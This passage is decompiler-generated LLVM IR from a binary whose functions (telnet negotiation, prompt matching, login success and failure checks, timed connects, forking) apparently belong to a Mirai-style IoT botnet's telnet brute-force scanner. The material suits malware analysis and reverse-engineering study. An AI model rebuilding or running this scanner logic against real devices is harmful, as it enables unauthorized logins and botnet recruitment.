dec_label_pc_9da0:                                ; preds = %dec_label_pc_9da0.lr.ph, %dec_label_pc_9da0
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9da0.lr.ph ], [ %v1_9db4, %dec_label_pc_9da0 ]
  %v5_9dac = mul nuw nsw i32 %storemerge25, 4
  %v6_9dac = add i32 %v5_9dac, %v2_9d8c
  %v7_9dac = inttoptr i32 %v6_9dac to i32*
  store i32 0, i32* %v7_9dac, align 4
  %v1_9db4 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9db4, 32
  br i1 %tmp21, label %dec_label_pc_9da0, label %dec_label_pc_9dc8

dec_label_pc_9dc8:                                ; preds = %dec_label_pc_9da0
  %v13_9d60 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9dcc = udiv i32 %arg1, 32
  %v3_9dd8 = mul nuw nsw i32 %v3_9dcc, 4
  %v2_9de0 = add nsw i32 %v3_9dd8, -136
  %v2_9de4 = add i32 %v2_9de0, %v13_9d60
  %v1_9de8 = inttoptr i32 %v2_9de4 to i32*
  %v2_9de8 = load i32, i32* %v1_9de8, align 4
  %v1_9df0 = urem i32 %arg1, 32
  %v6_9df8 = shl i32 1, %v1_9df0
  %v2_9dfc = or i32 %v2_9de8, %v6_9df8
  store i32 %v2_9dfc, i32* %v1_9de8, align 4
  %v1_9e1c = add i32 %arg1, 1
  %v2_9e24 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9e38 = call i32 @__libc_select(i32 %v1_9e1c, i32 %v2_9d8c, i32 0, i32 0, i32 %v2_9e24)
  %v5_9e44 = icmp sgt i32 %v5_9e38, 0
  br i1 %v5_9e44, label %dec_label_pc_9e54, label %dec_label_pc_9e48

dec_label_pc_9e48:                                ; preds = %dec_label_pc_9dc8
  br label %dec_label_pc_9e74

dec_label_pc_9e54:                                ; preds = %dec_label_pc_9dc8
  %v5_9e68 = inttoptr i32 %arg3 to i32*
  %v6_9e68 = call i32 @__libc_recv(i32 %arg1, i32* %v5_9e68, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9e74

dec_label_pc_9e74:                                ; preds = %dec_label_pc_9e48, %dec_label_pc_9e54
  %storemerge = phi i32 [ %v6_9e68, %dec_label_pc_9e54 ], [ 0, %dec_label_pc_9e48 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9d8c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9e74, { 1, 0 }
  uselistorder label %dec_label_pc_9da0, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9ea0 = icmp eq i32 %arg2, 0
  br i1 %v2_9ea0, label %dec_label_pc_9ea8, label %dec_label_pc_9eb8

dec_label_pc_9ea8:                                ; preds = %entry
  %v2_9eac = load i32, i32* %arg1, align 4
  %v1_9eb4 = call i32 @__libc_close(i32 %v2_9eac)
  br label %dec_label_pc_9eb8

dec_label_pc_9eb8:                                ; preds = %entry, %dec_label_pc_9ea8
  %v2_9ec0 = add i32 %tmp, 16
  %v3_9ec0 = inttoptr i32 %v2_9ec0 to i32*
  store i32 0, i32* %v3_9ec0, align 4
  %v3_9ec4 = load i32, i32* %stack_var_-24, align 4
  %v1_9ed0 = trunc i32 %v3_9ec4 to i8
  %v3_9ed0 = add i32 %tmp, 8
  %v4_9ed0 = inttoptr i32 %v3_9ed0 to i8*
  store i8 %v1_9ed0, i8* %v4_9ed0, align 1
  %v1_9ed8 = add i32 %tmp, 24
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i32*
  %v3_9ed8 = load i32, i32* %v2_9ed8, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9ee8 = inttoptr i32 %v3_9ed8 to i8*
  %v3_9ee8 = call i32 @__GI_memset(i8* %v2_9ee8, i32 0)
  ret i32 %v3_9ee8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9eb8, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9ef8 = load i32, i32* @fp, align 4
  %v2_9f10 = inttoptr i32 %arg1 to i32*
  %v3_9f10 = call i32 @advance_state(i32* %v2_9f10, i32 0)
  %v3_9f1c = add i32 %arg1, 9
  %v4_9f1c = inttoptr i32 %v3_9f1c to i8*
  store i8 1, i8* %v4_9f1c, align 1
  store i32 %v3_9ef8, i32* @fp, align 4
  ret i32 %v3_9f10
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9f28 = load i32, i32* @fp, align 4
  %v3_9f40 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_2c504.61 to i32))
  store i32 %v3_9f28, i32* @fp, align 4
  ret i32 %v3_9f40
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9f58 = load i32, i32* @fp, align 4
  %v3_9f70 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_2c4e4.70 to i32))
  store i32 %v3_9f58, i32* @fp, align 4
  ret i32 %v3_9f70

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40848, i32* %stack_var_-4, align 4
  %v2_9f8c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9f8c, i32* @fp, align 4
  %v1_9f9c = call i32 @contains_success(i32 %arg1)
  %v2_9fa4 = icmp eq i32 %v1_9f9c, 0
  br i1 %v2_9fa4, label %dec_label_pc_9fac, label %dec_label_pc_9fd4

dec_label_pc_9fac:                                ; preds = %entry
  %v1_9fb0 = call i32 @contains_fail(i32 %arg1)
  %v2_9fb8 = icmp ne i32 %v1_9fb0, 0
  %. = zext i1 %v2_9fb8 to i32
  br label %dec_label_pc_9fd4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_9fac, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9fac ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_a014

dec_label_pc_a014:                                ; preds = %dec_label_pc_a014, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_a018, %dec_label_pc_a014 ]
  %v1_a018 = add i32 %stack_var_-24.0, 1
  %v3_a024 = mul i32 %v1_a018, 4
  %v2_a030 = add i32 %v3_a024, %arg2
  %v1_a034 = inttoptr i32 %v2_a030 to i32*
  %v2_a034 = load i32, i32* %v1_a034, align 4
  %v2_a038 = icmp eq i32 %v2_a034, 0
  br i1 %v2_a038, label %dec_label_pc_a094.preheader, label %dec_label_pc_a014

dec_label_pc_a094.preheader:                      ; preds = %dec_label_pc_a014
  %v3_a06c = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_a094

dec_label_pc_a04c:                                ; preds = %dec_label_pc_a094
  %v3_a050 = mul i32 %storemerge2, 4
  %v2_a05c = add i32 %v3_a050, %arg2
  %v1_a060 = inttoptr i32 %v2_a05c to i32*
  %v2_a060 = load i32, i32* %v1_a060, align 4
  %v4_a06c = call i32 @strcasestr(i8* %v3_a06c, i32 %v2_a060, i32 %v3_a050)
  %v2_a074 = icmp eq i32 %v4_a06c, 0
  %v1_a08c = add nuw i32 %storemerge2, 1
  br i1 %v2_a074, label %dec_label_pc_a094, label %dec_label_pc_a0ac

dec_label_pc_a094:                                ; preds = %dec_label_pc_a04c, %dec_label_pc_a094.preheader
  %storemerge2 = phi i32 [ %v1_a08c, %dec_label_pc_a04c ], [ 0, %dec_label_pc_a094.preheader ]
  %v5_a0a0 = icmp slt i32 %storemerge2, %v1_a018
  br i1 %v5_a0a0, label %dec_label_pc_a04c, label %dec_label_pc_a0ac

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a094, %dec_label_pc_a04c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a04c ], [ 0, %dec_label_pc_a094 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_a018, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a0c0 = load i32, i32* @fp, align 4
  store i32 %v3_a0c0, i32* %stack_var_-16, align 4
  %v13_a0c0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_a0e8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a0f8 = or i32 %v2_a0e8, 2048
  store i32 %v1_a0f8, i32* @r2, align 4
  %v2_a10c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_a128 = urem i32 %arg3, 65536
  %v1_a130 = call i32 @htons(i32 %v3_a128)
  %v3_a158 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_a160 = icmp eq i32 %v3_a158, 0
  br i1 %v2_a160, label %dec_label_pc_a174, label %dec_label_pc_a168

dec_label_pc_a168:                                ; preds = %entry
  br label %dec_label_pc_a32c

dec_label_pc_a174:                                ; preds = %entry
  %v3_a19c = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_a19c = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_a19c, i32 16)
  %v1_a1ac = icmp slt i32 %v4_a19c, 0
  br i1 %v1_a1ac, label %dec_label_pc_a1b4, label %dec_label_pc_a2f0

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a174
  %v0_a1b4 = call i32 @__errno_location()
  %v1_a1bc = inttoptr i32 %v0_a1b4 to i32*
  %v2_a1bc = load i32, i32* %v1_a1bc, align 4
  %v7_a1c0 = icmp eq i32 %v2_a1bc, 115
  br i1 %v7_a1c0, label %dec_label_pc_a1ec.lr.ph, label %dec_label_pc_a2e4

dec_label_pc_a1ec.lr.ph:                          ; preds = %dec_label_pc_a1b4
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_a1d8 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %dec_label_pc_a1ec.lr.ph, %dec_label_pc_a1ec
  %storemerge14 = phi i32 [ 0, %dec_label_pc_a1ec.lr.ph ], [ %v1_a200, %dec_label_pc_a1ec ]
  %v5_a1f8 = mul nuw nsw i32 %storemerge14, 4
  %v6_a1f8 = add i32 %v5_a1f8, %v2_a1d8
  %v7_a1f8 = inttoptr i32 %v6_a1f8 to i32*
  store i32 0, i32* %v7_a1f8, align 4
  %v1_a200 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_a200, 32
  br i1 %tmp32, label %dec_label_pc_a1ec, label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %dec_label_pc_a1ec
  %v3_a218 = udiv i32 %arg1, 32
  %v3_a224 = mul nuw nsw i32 %v3_a218, 4
  %v2_a22c = add nsw i32 %v3_a224, -160
  %v2_a230 = add i32 %v2_a22c, %v13_a0c0
  %v1_a234 = inttoptr i32 %v2_a230 to i32*
  %v2_a234 = load i32, i32* %v1_a234, align 4
  %v1_a23c = urem i32 %arg1, 32
  %v6_a244 = shl i32 1, %v1_a23c
  %v2_a248 = or i32 %v2_a234, %v6_a244
  store i32 %v2_a248, i32* %v1_a234, align 4
  %v1_a268 = add i32 %arg1, 1
  %v2_a270 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a288 = call i32 @__libc_select(i32 %v1_a268, i32 0, i32 %v2_a1d8, i32 0, i32 %v2_a270)
  %tmp33 = icmp slt i32 %v5_a288, 1
  br i1 %tmp33, label %dec_label_pc_a2d8, label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a214
  %v0_a2bc = call i32 @getsockopt()
  %v3_a2c0 = load i32, i32* %stack_var_-192, align 4
  %v2_a2c4 = icmp eq i32 %v3_a2c0, 0
  br i1 %v2_a2c4, label %dec_label_pc_a2f0, label %dec_label_pc_a2cc

dec_label_pc_a2cc:                                ; preds = %dec_label_pc_a298
  br label %dec_label_pc_a32c

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a214
  br label %dec_label_pc_a32c

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a1b4
  br label %dec_label_pc_a32c

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a174, %dec_label_pc_a298
  store i32 0, i32* @r2, align 4
  %v2_a2fc = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a30c = and i32 %v2_a2fc, -2049
  store i32 %v1_a30c, i32* @r2, align 4
  %v2_a320 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a32c

dec_label_pc_a32c:                                ; preds = %dec_label_pc_a2e4, %dec_label_pc_a2d8, %dec_label_pc_a2cc, %dec_label_pc_a168, %dec_label_pc_a2f0
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a2d8 ], [ 1, %dec_label_pc_a2f0 ], [ 0, %dec_label_pc_a2cc ], [ 0, %dec_label_pc_a2e4 ], [ 0, %dec_label_pc_a168 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_a1d8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_a32c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a1ec, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_a33c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a33c, i32* @ip, align 4
  %v3_a340 = load i32, i32* @r4, align 4
  %v6_a340 = load i32, i32* @r5, align 4
  %v9_a340 = load i32, i32* @r6, align 4
  %v0_a34c = call i32 @__libc_fork()
  %v2_a35c = icmp eq i32 %v0_a34c, 0
  br i1 %v2_a35c, label %dec_label_pc_a4bc, label %dec_label_pc_a370

dec_label_pc_a370:                                ; preds = %entry
  %v2_a374 = load i32, i32* @global_var_2c910.72, align 4
  %v5_a374 = load i32, i32* @global_var_2c914.73, align 4
  %v2_a380 = add i32 %v2_a374, 1
  %v3_a380 = icmp eq i32 %v2_a380, 0
  %v4_a384 = zext i1 %v3_a380 to i32
  %v5_a384 = add i32 %v4_a384, %v5_a374
  store i32 %v2_a380, i32* @global_var_2c910.72, align 4
  store i32 %v5_a384, i32* @global_var_2c914.73, align 4
  %v3_a398 = udiv i32 %v2_a380, 1073741824
  %v3_a39c = mul i32 %v5_a384, 4
  %v2_a3a0 = or i32 %v3_a39c, %v3_a398
  store i32 %v2_a3a0, i32* @r4, align 4
  %v3_a3a4 = mul i32 %v2_a380, 4
  %v1_a3a8 = add i32 %v3_a3a4, 4
  %v1_a3b0 = call i32 @malloc(i32 %v1_a3a8)
  br label %dec_label_pc_a408

dec_label_pc_a3c8:                                ; preds = %dec_label_pc_a408, %dec_label_pc_a454
  %v3_a3cc = mul i32 %storemerge3, 4
  %v2_a3d8 = add i32 %v3_a3cc, %v1_a3b0
  %v2_a3ec = load i32, i32* @global_var_32b90.75, align 4
  %v2_a3f0 = add i32 %v2_a3ec, %v3_a3cc
  %v1_a3f4 = inttoptr i32 %v2_a3f0 to i32*
  %v2_a3f4 = load i32, i32* %v1_a3f4, align 4
  %v2_a3f8 = inttoptr i32 %v2_a3d8 to i32*
  store i32 %v2_a3f4, i32* %v2_a3f8, align 4
  %v1_a400 = add i32 %storemerge3, 1
  br label %dec_label_pc_a408

dec_label_pc_a408:                                ; preds = %dec_label_pc_a370, %dec_label_pc_a3c8
  %storemerge3 = phi i32 [ 0, %dec_label_pc_a370 ], [ %v1_a400, %dec_label_pc_a3c8 ]
  %v2_a420 = load i32, i32* @global_var_2c910.72, align 4
  %v5_a420 = load i32, i32* @global_var_2c914.73, align 4
  %v2_a434 = add i32 %v2_a420, -1
  %v3_a434 = icmp ne i32 %v2_a420, 0
  %v3_a438 = add i32 %v5_a420, -1
  %v5_a438 = sext i1 %v3_a434 to i32
  %v9_a44c = icmp eq i32 %v3_a438, %v5_a438
  br i1 %v9_a44c, label %dec_label_pc_a454, label %dec_label_pc_a3c8

dec_label_pc_a454:                                ; preds = %dec_label_pc_a408
  store i32 %v2_a434, i32* @r5, align 4
  store i32 %storemerge3, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a434, %storemerge3
  br i1 %tmp, label %dec_label_pc_a3c8, label %dec_label_pc_a474

dec_label_pc_a474:                                ; preds = %dec_label_pc_a454
  store i32 %v5_a420, i32* @r4, align 4
  %v3_a47c = mul i32 %v2_a420, 4
  %v2_a488 = add i32 %v1_a3b0, -4
  %v1_a48c = add i32 %v2_a488, %v3_a47c
  %v2_a494 = inttoptr i32 %v1_a48c to i32*
  store i32 %v0_a34c, i32* %v2_a494, align 4
  %v2_a49c = load i32, i32* @global_var_32b90.75, align 4
  store i32 %v2_a49c, i32* @r0, align 4
  %v0_a4a4 = call i32 @free()
  store i32 %v1_a3b0, i32* @global_var_32b90.75, align 4
  br label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %entry, %dec_label_pc_a474
  store i32 %v3_a340, i32* @r4, align 4
  store i32 %v6_a340, i32* @r5, align 4
  store i32 %v9_a340, i32* @r6, align 4
  ret i32 %v0_a34c

; uselistorder directives
  uselistorder i32 %storemerge3, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a3cc, { 1, 0 }
  uselistorder i32 %v1_a3b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a4bc, { 1, 0 }
  uselistorder label %dec_label_pc_a408, { 1, 0 }
  uselistorder label %dec_label_pc_a3c8, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a4f4 = add i32 %arg2, 1
  %v1_a4f8 = inttoptr i32 %v1_a4f4 to i8*
  %v2_a4f8 = load i8, i8* %v1_a4f8, align 1
  %v7_a504 = icmp ult i8 %v2_a4f8, -5
  br i1 %v7_a504, label %dec_label_pc_a650, label %dec_label_pc_a50c

dec_label_pc_a50c:                                ; preds = %entry
  %v7_a514 = icmp eq i8 %v2_a4f8, -1
  br i1 %v7_a514, label %dec_label_pc_a518, label %dec_label_pc_a534

dec_label_pc_a518:                                ; preds = %dec_label_pc_a50c
  br label %dec_label_pc_a650

dec_label_pc_a534:                                ; preds = %dec_label_pc_a50c
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a550 = bitcast i8* %stack_var_-17 to i32*
  %v6_a550 = call i32 @__libc_send(i32 %arg1, i32* %v5_a550, i32 1, i32 16384)
  %v2_a55c = load i8, i8* %v1_a4f8, align 1
  %v7_a560 = icmp eq i8 %v2_a55c, -4
  br i1 %v7_a560, label %dec_label_pc_a568, label %dec_label_pc_a574

dec_label_pc_a568:                                ; preds = %dec_label_pc_a534
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a574:                                ; preds = %dec_label_pc_a534
  %v2_a57c = load i8, i8* %v1_a4f8, align 1
  %v7_a580 = icmp eq i8 %v2_a57c, -2
  br i1 %v7_a580, label %dec_label_pc_a588, label %dec_label_pc_a594

dec_label_pc_a588:                                ; preds = %dec_label_pc_a574
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a594:                                ; preds = %dec_label_pc_a574
  %v2_a59c = load i8, i8* %v1_a4f8, align 1
  %v7_a5a0 = icmp eq i8 %v2_a59c, 3
  %v7_a5b4 = icmp eq i8 %v2_a59c, -3
  br i1 %v7_a5a0, label %dec_label_pc_a5a8, label %dec_label_pc_a5e0

dec_label_pc_a5a8:                                ; preds = %dec_label_pc_a594
  br i1 %v7_a5b4, label %dec_label_pc_a5bc, label %dec_label_pc_a5c8

dec_label_pc_a5bc:                                ; preds = %dec_label_pc_a5a8
  br label %dec_label_pc_a5d0

dec_label_pc_a5c8:                                ; preds = %dec_label_pc_a5a8
  br label %dec_label_pc_a5d0

dec_label_pc_a5d0:                                ; preds = %dec_label_pc_a5bc, %dec_label_pc_a5c8
  %storemerge = phi i8 [ -3, %dec_label_pc_a5c8 ], [ -5, %dec_label_pc_a5bc ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a5e0:                                ; preds = %dec_label_pc_a594
  br i1 %v7_a5b4, label %dec_label_pc_a5f4, label %dec_label_pc_a600

dec_label_pc_a5f4:                                ; preds = %dec_label_pc_a5e0
  br label %dec_label_pc_a608

dec_label_pc_a600:                                ; preds = %dec_label_pc_a5e0
  br label %dec_label_pc_a608

dec_label_pc_a608:                                ; preds = %dec_label_pc_a5f4, %dec_label_pc_a600
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a600 ], [ -4, %dec_label_pc_a5f4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5d0, %dec_label_pc_a588, %dec_label_pc_a568, %dec_label_pc_a608
  %v5_a628 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a550, i32 1, i32 16384)
  %v1_a630 = add i32 %arg2, 2
  %v4_a644 = inttoptr i32 %v1_a630 to i32*
  %v5_a644 = call i32 @__libc_send(i32 %arg1, i32* %v4_a644, i32 1, i32 16384)
  br label %dec_label_pc_a650

dec_label_pc_a650:                                ; preds = %dec_label_pc_a518, %dec_label_pc_a614, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a650, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a614, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a608, { 1, 0 }
  uselistorder label %dec_label_pc_a5d0, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a680 = call i32 @strlen(i8* %arg1)
  %v2_a6c8 = add i32 %v3_a680, %tmp
  br label %dec_label_pc_a79c

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a704, %dec_label_pc_a6e0, %dec_label_pc_a6bc
  %v1_a6a4 = add nsw i32 %stack_var_-24.013, 1
  %v7_a6b8 = icmp sgt i32 %v3_a680, %v1_a6a4
  br i1 %v7_a6b8, label %dec_label_pc_a6bc, label %dec_label_pc_a74c

dec_label_pc_a6bc:                                ; preds = %dec_label_pc_a6ac.preheader, %dec_label_pc_a6a0
  %stack_var_-24.013 = phi i32 [ %v1_a6a4, %dec_label_pc_a6a0 ], [ %stack_var_-24.1, %dec_label_pc_a6ac.preheader ]
  %v2_a6d0 = sub i32 %v2_a6c8, %stack_var_-24.013
  %v1_a6d4 = inttoptr i32 %v2_a6d0 to i8*
  %v2_a6d4 = load i8, i8* %v1_a6d4, align 1
  %v2_a6d8 = icmp eq i8 %v2_a6d4, 0
  br i1 %v2_a6d8, label %dec_label_pc_a6a0, label %dec_label_pc_a6e0

dec_label_pc_a6e0:                                ; preds = %dec_label_pc_a6bc
  %v2_a6f8 = load i8, i8* %v1_a6d4, align 1
  %v7_a6fc = icmp eq i8 %v2_a6f8, 32
  br i1 %v7_a6fc, label %dec_label_pc_a6a0, label %dec_label_pc_a704

dec_label_pc_a704:                                ; preds = %dec_label_pc_a6e0
  %v2_a71c = load i8, i8* %v1_a6d4, align 1
  %v7_a720 = icmp eq i8 %v2_a71c, 13
  br i1 %v7_a720, label %dec_label_pc_a6a0, label %dec_label_pc_a728

dec_label_pc_a728:                                ; preds = %dec_label_pc_a704
  %v2_a740 = load i8, i8* %v1_a6d4, align 1
  %v7_a744 = icmp eq i8 %v2_a740, 10
  br i1 %v7_a744, label %dec_label_pc_a6a0, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a6a0, %dec_label_pc_a6ac.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a6ac.preheader ], [ %stack_var_-24.013, %dec_label_pc_a728 ], [ %v1_a6a4, %dec_label_pc_a6a0 ]
  %v2_a760 = sub i32 %v2_a6c8, %stack_var_-24.0.lcssa
  %v1_a764 = inttoptr i32 %v2_a760 to i8*
  %v2_a764 = load i8, i8* %v1_a764, align 1
  %v2_a774 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1a710.77 to i32)
  %v1_a778 = inttoptr i32 %v2_a774 to i8*
  %v2_a778 = load i8, i8* %v1_a778, align 1
  %v9_a77c = icmp eq i8 %v2_a764, %v2_a778
  %v1_a794 = add i32 %storemerge2, 1
  br i1 %v9_a77c, label %dec_label_pc_a7bc, label %dec_label_pc_a79c

dec_label_pc_a79c:                                ; preds = %dec_label_pc_a74c, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a74c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a794, %dec_label_pc_a74c ]
  %v3_a7a4 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a710.77, i32 0, i32 0))
  %v3_a7ac = icmp ult i32 %storemerge2, %v3_a7a4
  br i1 %v3_a7ac, label %dec_label_pc_a6ac.preheader, label %dec_label_pc_a7bc

dec_label_pc_a6ac.preheader:                      ; preds = %dec_label_pc_a79c
  %v7_a6b812 = icmp sgt i32 %v3_a680, %stack_var_-24.1
  br i1 %v7_a6b812, label %dec_label_pc_a6bc, label %dec_label_pc_a74c

dec_label_pc_a7bc:                                ; preds = %dec_label_pc_a79c, %dec_label_pc_a74c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a74c ], [ 0, %dec_label_pc_a79c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a680, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a74c, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a7d4 = load i32, i32* @fp, align 4
  store i32 %v3_a7d4, i32* %stack_var_-16, align 4
  %v13_a7d4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a824 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a864 = udiv i32 %arg1, 32
  %v3_a870 = mul nuw nsw i32 %v3_a864, 4
  %v1_a888 = urem i32 %arg1, 32
  %v6_a890 = shl i32 1, %v1_a888
  %v1_a8b4 = add i32 %arg1, 1
  %v2_a8bc = ptrtoint i32* %stack_var_-176 to i32
  %v6_a9dc = inttoptr i32 %arg2 to i8*
  %v2_a9f0 = icmp eq i32 %arg3, 0
  %v1_a9fc = inttoptr i32 %arg6 to i8*
  %v5_aa40 = icmp sgt i32 %arg5, 0
  %v2_a878 = add nsw i32 %v3_a870, -152
  %v2_a87c = add i32 %v2_a878, %v13_a7d4
  %v1_a880 = inttoptr i32 %v2_a87c to i32*
  br label %dec_label_pc_aa18

dec_label_pc_a838.lr.ph:                          ; preds = %dec_label_pc_aa2c, %dec_label_pc_aa38
  br label %dec_label_pc_a838

dec_label_pc_a838:                                ; preds = %dec_label_pc_a838.lr.ph, %dec_label_pc_a838
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a838.lr.ph ], [ %v1_a84c, %dec_label_pc_a838 ]
  %v5_a844 = mul nuw nsw i32 %storemerge27, 4
  %v6_a844 = add i32 %v5_a844, %v2_a824
  %v7_a844 = inttoptr i32 %v6_a844 to i32*
  store i32 0, i32* %v7_a844, align 4
  %v1_a84c = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a84c, 32
  br i1 %tmp30, label %dec_label_pc_a838, label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a838
  %v2_a880 = load i32, i32* %v1_a880, align 4
  %v2_a894 = or i32 %v2_a880, %v6_a890
  store i32 %v2_a894, i32* %v1_a880, align 4
  %v5_a8d0 = call i32 @__libc_select(i32 %v1_a8b4, i32 %v2_a824, i32 0, i32 0, i32 %v2_a8bc)
  %tmp31 = icmp slt i32 %v5_a8d0, 1
